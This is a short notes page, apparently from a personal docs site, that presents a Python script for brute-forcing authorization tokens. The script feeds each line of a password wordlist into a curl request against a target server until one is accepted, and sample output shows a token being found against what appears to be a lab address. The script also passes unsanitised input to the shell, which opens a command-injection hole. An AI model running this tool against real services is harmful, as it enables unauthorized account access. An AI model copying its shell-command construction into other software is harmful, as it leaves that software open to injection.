---
title: Python Scripts
sidebar_label: Python Scripts
---

## Run shell programs by reading command line arguments
This script reads different tokens from a file and pass them to curl command to find out the valid token for authorization

```python
import subprocess
import argparse

def crack(filename, ip_addr) :

  with open(filename) as f:
    password_list = f.readlines()
  
  # to remove whitespace characters like `\n` at the end of each line
  password_list = [x.strip() for x in password_list]  

  print(password_list)

  for password in password_list :
    comd = "curl -s -H 'Authorization: Token " + password + "' " + ip_addr  
    print("Trying..." + password)
    output = subprocess.run(comd, capture_output=True, shell=True).stdout.decode('utf-8')

    if "Unauth".lower() in output.lower():
      print("Unauth".lower()+"-->" + output.lower())
      continue
    else :
      print("Found : " + password)
      break

if __name__ == "__main__":
  parser = argparse.ArgumentParser()
  parser.add_argument("filename", help="Enter the filename containing passwords")
  parser.add_argument("ip_addr", help="Enter the IP address of server including http://")

  args = parser.parse_args()
  crack(args.filename, args.ip_addr)
```
Output
```sh
$ python3 crack.py /root/wordlists/100-common-passwords.txt http://192.107.107.3
Trying...damian
unauth-->unauthorized access
Trying...123123123
Found : 123123123
```
